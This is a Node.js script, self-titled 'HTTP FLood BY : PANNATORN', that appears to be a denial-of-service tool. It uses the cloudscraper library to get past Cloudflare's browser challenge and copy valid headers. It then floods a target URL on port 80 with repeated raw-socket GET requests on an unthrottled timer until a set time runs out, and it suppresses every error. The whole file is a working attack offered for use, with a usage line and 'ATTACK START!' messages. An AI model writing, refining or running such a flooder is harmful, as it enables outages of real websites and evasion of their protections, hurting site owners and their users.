require('events').EventEmitter.defaultMaxListeners = 0;
const CloudScraper = require('cloudscraper'),
    path = require('path'),
    url = require('url');

if (process.argv.length !== 5) {
    console.log('HTTP FLood BY : PANNATORN');
    console.log(`Usage : node ${path.basename(__filename)} <URL> <TIME> <THRADE>`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4],
    host = url.parse(target).host;

let getHeaders = function () {
    return new Promise(function (resolve, reject) {
        CloudScraper.get({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 1
        }, function (error, response) {
            if (error) {
                console.log(error)
                return start();
            }
            let headers = '';
            Object.keys(response.request.headers).forEach(function (i, e) {
                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                    return;
                }
                headers += i + ': ' + response.request.headers[i] + '\r\n';
            });
            // console.log(error.message);
            // console.log(headers);
            // console.log('HEADERS : '+headers+'');
            resolve(headers);
        });
    });
}

function send_req(headers) {
    const net = require('net'),
        client = new net.Socket();

    client.connect(80, host);
    client.setTimeout(10000);

    for (let i = 0; i < req_per_ip; ++i) {
        client.write(
            `GET ${target} HTTP/1.1\r\n` +
            headers + '\r\n\r\n'
        )
        console.log('CHAMP FLood GET : '+i);
        //console.log(headers);
    }

    client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    });
}

let init = function () {
    getHeaders().then(function (result) {
        console.log('ATTACK START! => URL : '+target+' PORT : 80 TIME : '+time+' RESETIP : '+req_per_ip+'');
        // console.log('HEADERS : '+headers+'');
        // console.log(i);
        // console.log(i);
        setInterval(() => {
            send_req(result);
        });
    });
};

// for (let i = 0; i < req_per_ip; ++i){
//     console.log(i);
// }

setTimeout(() => {
    console.log('ATTACK END!');
    process.exit(0)
}, time * 1000);

init();

process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});